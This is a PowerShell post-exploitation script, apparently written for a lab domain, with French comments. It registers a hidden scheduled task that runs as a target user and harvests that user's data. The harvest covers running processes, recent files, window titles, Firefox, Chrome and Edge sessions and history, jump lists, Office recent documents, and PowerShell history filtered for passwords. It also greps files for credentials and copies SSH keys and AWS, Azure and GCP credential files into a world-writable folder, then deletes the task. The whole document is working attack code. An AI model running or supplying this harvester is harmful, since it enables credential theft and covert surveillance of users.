# schtask-userfiles.ps1
# Usage : .\schtask-userfiles.ps1 -TargetUser "LAB\victime" [-OutputDir "C:\Lab\harvest"] [-Timeout 15]

param(
    [Parameter(Mandatory)][string]$TargetUser,
    [string]$OutputDir = "C:\Lab\harvest",
    [string]$TaskName = "MaTaskUserFiles",
    [int]$Timeout = 15
)

New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null
icacls $OutputDir /grant "Everyone:(OI)(CI)F" | Out-Null

foreach ($f in @(
    "userfiles.ps1",
    "userfiles-processes.log",
    "userfiles-recent.log",
    "userfiles-explorer.log",
    "userfiles-jumplist.log",
    "userfiles-office.log",
    "userfiles-pshistory.log",
    "userfiles-sensitivefiles.log"
)) {
    Remove-Item -Path "$OutputDir\$f" -Force -ErrorAction SilentlyContinue
    New-Item -Path "$OutputDir\$f" -ItemType File -Force | Out-Null
    icacls "$OutputDir\$f" /grant "Everyone:(F)" | Out-Null
}

Write-Host "[*] Creating user files harvest script..." -ForegroundColor Cyan
@"
`$outputDir = "$OutputDir"
`$me = `$env:USERNAME

# ============================================================
# 1. PROCESSUS de l'utilisateur uniquement (avec cmdline)
# ============================================================
"[*] User processes for `$me - `$(Get-Date)" | Out-File "`$outputDir\userfiles-processes.log"
try {
    Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | ForEach-Object {
        try {
            `$owner = Invoke-CimMethod -InputObject `$_ -MethodName GetOwner -ErrorAction SilentlyContinue
            if (`$owner.User -eq `$me) {
                "--- `$(`$_.Name) (PID `$(`$_.ProcessId)) ---" | Out-File "`$outputDir\userfiles-processes.log" -Append
                "Path    : `$(`$_.ExecutablePath)" | Out-File "`$outputDir\userfiles-processes.log" -Append
                "CmdLine : `$(`$_.CommandLine)" | Out-File "`$outputDir\userfiles-processes.log" -Append
                "" | Out-File "`$outputDir\userfiles-processes.log" -Append
            }
        } catch {}
    }
} catch {
    "[ERROR] Process enumeration failed : `$_" | Out-File "`$outputDir\userfiles-processes.log" -Append
}

# ============================================================
# 2. FICHIERS RECENTS - resolus vers vrais chemins
# ============================================================
"[*] Recent files - `$(Get-Date)" | Out-File "`$outputDir\userfiles-recent.log"
`$recentPath = "`$env:APPDATA\Microsoft\Windows\Recent"
if (Test-Path `$recentPath) {
    `$shell = New-Object -ComObject WScript.Shell
    Get-ChildItem `$recentPath -Filter "*.lnk" -Force -ErrorAction SilentlyContinue |
        Sort-Object LastWriteTime -Descending |
        Select-Object -First 50 |
        ForEach-Object {
            try {
                `$shortcut = `$shell.CreateShortcut(`$_.FullName)
                `$target = `$shortcut.TargetPath
                if (`$target) {
                    "`$(`$_.LastWriteTime.ToString('yyyy-MM-dd HH:mm')) | `$target" | Out-File "`$outputDir\userfiles-recent.log" -Append
                }
            } catch {}
        }
} else {
    "[WARN] Recent folder not found" | Out-File "`$outputDir\userfiles-recent.log" -Append
}

# ============================================================
# 3. FENETRES OUVERTES (titres, pas de bruit)
# ============================================================
"[*] Open windows - `$(Get-Date)" | Out-File "`$outputDir\userfiles-explorer.log"

try {
    `$shellApp = New-Object -ComObject Shell.Application
    `$windows = `$shellApp.Windows()
    if (`$windows.Count -gt 0) {
        "[*] Explorer folders open :" | Out-File "`$outputDir\userfiles-explorer.log" -Append
        foreach (`$w in `$windows) {
            try {
                "`$(`$w.LocationName) | `$(`$w.LocationURL)" | Out-File "`$outputDir\userfiles-explorer.log" -Append
            } catch {}
        }
    }
} catch {}

"`n[*] Window titles :" | Out-File "`$outputDir\userfiles-explorer.log" -Append
try {
    Add-Type -TypeDefinition @'
using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;

public class WindowEnum {
    [DllImport("user32.dll")]
    public static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam);
    [DllImport("user32.dll")]
    public static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);
    [DllImport("user32.dll")]
    public static extern bool IsWindowVisible(IntPtr hWnd);
    [DllImport("user32.dll")]
    public static extern int GetWindowTextLength(IntPtr hWnd);

    public delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);

    public static List<string> GetVisibleTitles() {
        List<string> titles = new List<string>();
        EnumWindows((hWnd, lParam) => {
            if (IsWindowVisible(hWnd)) {
                int len = GetWindowTextLength(hWnd);
                if (len > 0) {
                    StringBuilder sb = new StringBuilder(len + 1);
                    GetWindowText(hWnd, sb, sb.Capacity);
                    string title = sb.ToString();
                    if (title != "Program Manager" &&
                        title != "Microsoft Text Input Application" &&
                        title != "MSCTFIME UI" &&
                        title != "Default IME" &&
                        !title.StartsWith("GDI+"))
                        titles.Add(title);
                }
            }
            return true;
        }, IntPtr.Zero);
        return titles;
    }
}
'@ -Language CSharp
    foreach (`$t in [WindowEnum]::GetVisibleTitles()) {
        "  `$t" | Out-File "`$outputDir\userfiles-explorer.log" -Append
    }
} catch {
    "[ERROR] WindowEnum failed : `$_" | Out-File "`$outputDir\userfiles-explorer.log" -Append
}

# ============================================================
# 3b. ONGLETS OUVERTS dans les navigateurs
# ============================================================
"`n[*] Browser open tabs - `$(Get-Date)" | Out-File "`$outputDir\userfiles-explorer.log" -Append

# Firefox - session restore + historique
`$ffProfiles = Get-ChildItem "`$env:APPDATA\Mozilla\Firefox\Profiles\" -ErrorAction SilentlyContinue | Where-Object { `$_.PSIsContainer }
if (`$ffProfiles) {
    foreach (`$ffp in `$ffProfiles) {
        `$suffix = `$ffp.Name -replace '[^a-zA-Z0-9]','_'
        `$recovery = "`$(`$ffp.FullName)\sessionstore-backups\recovery.jsonlz4"
        `$sessionStore = "`$(`$ffp.FullName)\sessionstore.jsonlz4"
        foreach (`$src in @(`$recovery, `$sessionStore)) {
            if (Test-Path `$src) {
                Copy-Item `$src "`$outputDir\firefox-`$suffix-session.jsonlz4" -Force -ErrorAction SilentlyContinue
                "[+] Firefox session file copied : `$src" | Out-File "`$outputDir\userfiles-explorer.log" -Append
            }
        }
        `$places = "`$(`$ffp.FullName)\places.sqlite"
        if (Test-Path `$places) {
            Copy-Item `$places "`$outputDir\firefox-`$suffix-places.sqlite" -Force -ErrorAction SilentlyContinue
            "[+] Firefox places.sqlite copied (history + bookmarks)" | Out-File "`$outputDir\userfiles-explorer.log" -Append
        }
    }
}

# Chrome - extract URLs from session files
`$chromeSessionPath = "`$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Sessions"
if (Test-Path `$chromeSessionPath) {
    "`n[*] Chrome open tabs :" | Out-File "`$outputDir\userfiles-explorer.log" -Append
    Get-ChildItem `$chromeSessionPath -Force -ErrorAction SilentlyContinue |
        Sort-Object LastWriteTime -Descending |
        Select-Object -First 2 |
        ForEach-Object {
            try {
                `$raw = [System.IO.File]::ReadAllBytes(`$_.FullName)
                `$text = [System.Text.Encoding]::UTF8.GetString(`$raw)
                `$seen = @{}
                [regex]::Matches(`$text, 'https?://[^\x00-\x1f\x7f-\x9f"<>\s]{5,500}') | ForEach-Object {
                    `$url = `$_.Value
                    if (`$url -notmatch 'chrome-extension|edge://|chrome://|\.woff|\.css|\.js\b|\.png|\.jpg|\.ico|\.svg|fonts\.g' -and -not `$seen.ContainsKey(`$url)) {
                        `$seen[`$url] = `$true
                        "  `$url" | Out-File "`$outputDir\userfiles-explorer.log" -Append
                    }
                }
            } catch {}
        }
}

# Edge - extract URLs from session files
`$edgeSessionPath = "`$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Sessions"
if (Test-Path `$edgeSessionPath) {
    "`n[*] Edge open tabs :" | Out-File "`$outputDir\userfiles-explorer.log" -Append
    Get-ChildItem `$edgeSessionPath -Force -ErrorAction SilentlyContinue |
        Sort-Object LastWriteTime -Descending |
        Select-Object -First 2 |
        ForEach-Object {
            try {
                `$raw = [System.IO.File]::ReadAllBytes(`$_.FullName)
                `$text = [System.Text.Encoding]::UTF8.GetString(`$raw)
                `$seen = @{}
                [regex]::Matches(`$text, 'https?://[^\x00-\x1f\x7f-\x9f"<>\s]{5,500}') | ForEach-Object {
                    `$url = `$_.Value
                    if (`$url -notmatch 'chrome-extension|edge://|chrome://|\.woff|\.css|\.js\b|\.png|\.jpg|\.ico|\.svg|fonts\.g|microsoftedgewelcome|ntp\.msn' -and -not `$seen.ContainsKey(`$url)) {
                        `$seen[`$url] = `$true
                        "  `$url" | Out-File "`$outputDir\userfiles-explorer.log" -Append
                    }
                }
            } catch {}
        }
}

# ============================================================
# 4. JUMP LISTS (fichiers recemment ouverts par application)
# ============================================================
"[*] Jump Lists - `$(Get-Date)" | Out-File "`$outputDir\userfiles-jumplist.log"
foreach (`$jlPath in @("`$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations", "`$env:APPDATA\Microsoft\Windows\Recent\CustomDestinations")) {
    if (Test-Path `$jlPath) {
        New-Item -ItemType Directory -Path "`$outputDir\jumplists" -Force | Out-Null
        Copy-Item "`$jlPath\*" "`$outputDir\jumplists\" -Force -ErrorAction SilentlyContinue
        "[+] Jump lists copied from `$jlPath" | Out-File "`$outputDir\userfiles-jumplist.log" -Append
    }
}

# ============================================================
# 5. DOCUMENTS OFFICE RECENTS (MRU registre)
# ============================================================
"[*] Office MRU - `$(Get-Date)" | Out-File "`$outputDir\userfiles-office.log"
foreach (`$ver in @("16.0", "15.0", "14.0")) {
    foreach (`$app in @("Word", "Excel", "PowerPoint", "Access")) {
        `$mruPath = "HKCU:\Software\Microsoft\Office\`$ver\`$app\File MRU"
        if (Test-Path `$mruPath) {
            "[*] Office `$ver `$app :" | Out-File "`$outputDir\userfiles-office.log" -Append
            (Get-ItemProperty `$mruPath -ErrorAction SilentlyContinue).PSObject.Properties |
                Where-Object { `$_.Name -like "Item *" } |
                ForEach-Object {
                    "  `$(`$_.Value)" | Out-File "`$outputDir\userfiles-office.log" -Append
                }
        }
    }
}

# ============================================================
# 6. HISTORIQUE POWERSHELL + patterns sensibles (FR + EN)
# ============================================================
"[*] PowerShell history - `$(Get-Date)" | Out-File "`$outputDir\userfiles-pshistory.log"
`$psHistory = "`$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
if (Test-Path `$psHistory) {
    Copy-Item `$psHistory "`$outputDir\ps-history.txt" -Force -ErrorAction SilentlyContinue
    `$lines = Get-Content `$psHistory
    "[+] PowerShell history : `$(`$lines.Count) lines total" | Out-File "`$outputDir\userfiles-pshistory.log" -Append
    "`n[*] Last 30 commands :" | Out-File "`$outputDir\userfiles-pshistory.log" -Append
    `$lines | Select-Object -Last 30 | Out-File "`$outputDir\userfiles-pshistory.log" -Append

    "`n[*] Sensitive patterns found :" | Out-File "`$outputDir\userfiles-pshistory.log" -Append
    `$patterns = @('password', 'passwd', 'secret', 'token', 'apikey', 'api_key', 'credential', 'convertto-securestring', 'net use', '-pass', 'mot de passe', 'motdepasse', 'mdp', 'identifiant', 'connexion', 'cle_api', 'jeton', 'confidentiel')
    `$lines | Where-Object {
        `$line = `$_
        (`$patterns | Where-Object { `$line -match `$_ }).Count -gt 0
    } | ForEach-Object {
        "  >> `$_" | Out-File "`$outputDir\userfiles-pshistory.log" -Append
    }
} else {
    "[WARN] No PowerShell history found" | Out-File "`$outputDir\userfiles-pshistory.log" -Append
}

# ============================================================
# 7. FICHIERS SENSIBLES dans le profil utilisateur
# ============================================================
"[*] Sensitive files scan - `$(Get-Date)" | Out-File "`$outputDir\userfiles-sensitivefiles.log"
`$searchPaths = @("`$env:USERPROFILE\Documents", "`$env:USERPROFILE\Desktop", "`$env:USERPROFILE\.ssh", "`$env:USERPROFILE\.aws", "`$env:USERPROFILE\.azure", "`$env:USERPROFILE\.gcp")
`$extensions = @("*.txt", "*.ini", "*.config", "*.xml", "*.json", "*.yml", "*.yaml", "*.env", "*.key", "*.pem", "*.pfx", "*.p12", "*.kdbx", "*.rdp")

foreach (`$searchPath in `$searchPaths) {
    if (Test-Path `$searchPath) {
        `$files = Get-ChildItem `$searchPath -Include `$extensions -Recurse -Force -ErrorAction SilentlyContinue -Depth 3 |
            Where-Object { `$_.Name -ne "desktop.ini" }
        if (`$files) {
            "[*] `$searchPath (`$(`$files.Count) file(s)) :" | Out-File "`$outputDir\userfiles-sensitivefiles.log" -Append
            foreach (`$file in `$files) {
                `$size = [math]::Round(`$file.Length / 1024, 1)
                "  `$(`$file.LastWriteTime.ToString('yyyy-MM-dd HH:mm')) | `${size}KB | `$(`$file.FullName)" | Out-File "`$outputDir\userfiles-sensitivefiles.log" -Append
            }
        }
    }
}

# Recherche de credentials dans les fichiers texte (< 100KB) - patterns FR + EN
"`n[*] Password patterns in files :" | Out-File "`$outputDir\userfiles-sensitivefiles.log" -Append
`$textExtensions = @("*.txt", "*.ini", "*.config", "*.xml", "*.json", "*.yml", "*.yaml", "*.env")
`$credPatterns = @('password', 'passwd', 'pwd', 'secret', 'token', 'apikey', 'api_key', 'connectionstring', 'credentials', 'mot_de_passe', 'motdepasse', 'mdp', 'identifiant', 'cle_api', 'cle_secrete', 'jeton', 'confidentiel', 'acces', 'login', 'utilisateur')
foreach (`$searchPath in @("`$env:USERPROFILE\Documents", "`$env:USERPROFILE\Desktop")) {
    if (Test-Path `$searchPath) {
        Get-ChildItem `$searchPath -Include `$textExtensions -Recurse -Force -ErrorAction SilentlyContinue -Depth 3 |
            Where-Object { `$_.Length -lt 102400 -and `$_.Name -ne "desktop.ini" } |
            ForEach-Object {
                `$filePath = `$_.FullName
                try {
                    Select-String -Path `$filePath -Pattern (`$credPatterns -join '|') -CaseSensitive:`$false -ErrorAction SilentlyContinue |
                        ForEach-Object {
                            "  `$filePath :`$(`$_.LineNumber) | `$(`$_.Line.Trim())" | Out-File "`$outputDir\userfiles-sensitivefiles.log" -Append
                        }
                } catch {}
            }
    }
}

# SSH keys
"`n[*] SSH keys :" | Out-File "`$outputDir\userfiles-sensitivefiles.log" -Append
`$sshPath = "`$env:USERPROFILE\.ssh"
if (Test-Path `$sshPath) {
    Get-ChildItem `$sshPath -Force -ErrorAction SilentlyContinue | ForEach-Object {
        "  `$(`$_.FullName) (`$(`$_.Length) bytes)" | Out-File "`$outputDir\userfiles-sensitivefiles.log" -Append
    }
    New-Item -ItemType Directory -Path "`$outputDir\ssh" -Force | Out-Null
    Copy-Item "`$sshPath\*" "`$outputDir\ssh\" -Force -ErrorAction SilentlyContinue
    "[+] SSH keys copied to `$outputDir\ssh\" | Out-File "`$outputDir\userfiles-sensitivefiles.log" -Append
} else {
    "[WARN] No .ssh folder found" | Out-File "`$outputDir\userfiles-sensitivefiles.log" -Append
}

# Cloud credentials
"`n[*] Cloud credentials :" | Out-File "`$outputDir\userfiles-sensitivefiles.log" -Append
foreach (`$cloudPath in @(
    "`$env:USERPROFILE\.aws\credentials",
    "`$env:USERPROFILE\.aws\config",
    "`$env:USERPROFILE\.azure\accessTokens.json",
    "`$env:USERPROFILE\.azure\azureProfile.json",
    "`$env:APPDATA\gcloud\credentials.db",
    "`$env:APPDATA\gcloud\application_default_credentials.json"
)) {
    if (Test-Path `$cloudPath) {
        "[+] Found : `$cloudPath" | Out-File "`$outputDir\userfiles-sensitivefiles.log" -Append
        `$cloudDir = "`$outputDir\cloud"
        New-Item -ItemType Directory -Path `$cloudDir -Force | Out-Null
        Copy-Item `$cloudPath "`$cloudDir\" -Force -ErrorAction SilentlyContinue
    }
}
"@ | Set-Content -Path "$OutputDir\userfiles.ps1" -Encoding ASCII
icacls "$OutputDir\userfiles.ps1" /grant "Everyone:(F)" | Out-Null

Write-Host "[*] Creating and starting scheduled task as $TargetUser..." -ForegroundColor Cyan
Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
$settings = New-ScheduledTaskSettingsSet -Hidden
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -STA -File $OutputDir\userfiles.ps1" -WorkingDirectory $OutputDir
$principal = New-ScheduledTaskPrincipal -UserId $TargetUser -LogonType Interactive -RunLevel Limited
Register-ScheduledTask -TaskName $TaskName -Action $action -Principal $principal -Settings $settings -Force | Out-Null
Start-ScheduledTask -TaskName $TaskName

Write-Host "[*] Waiting for execution (${Timeout}s)..." -ForegroundColor Cyan
Start-Sleep -Seconds $Timeout

$result = (Get-ScheduledTaskInfo -TaskName $TaskName).LastTaskResult
if ($result -eq 0) {
    Write-Host "[+] Success !" -ForegroundColor Green
    Write-Host "`n--- User Processes ---" -ForegroundColor Yellow
    Get-Content "$OutputDir\userfiles-processes.log" -ErrorAction SilentlyContinue
    Write-Host "`n--- Recent Files ---" -ForegroundColor Yellow
    Get-Content "$OutputDir\userfiles-recent.log" -ErrorAction SilentlyContinue
    Write-Host "`n--- Open Windows + Browser Tabs ---" -ForegroundColor Yellow
    Get-Content "$OutputDir\userfiles-explorer.log" -ErrorAction SilentlyContinue
    Write-Host "`n--- PowerShell History ---" -ForegroundColor Yellow
    Get-Content "$OutputDir\userfiles-pshistory.log" -ErrorAction SilentlyContinue
    Write-Host "`n--- Sensitive Files ---" -ForegroundColor Yellow
    Get-Content "$OutputDir\userfiles-sensitivefiles.log" -ErrorAction SilentlyContinue
} else {
    Write-Host "[-] Failed (LastTaskResult: $result)" -ForegroundColor Red
}

Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
Write-Host "[*] Scheduled task deleted." -ForegroundColor Cyan
                                                                         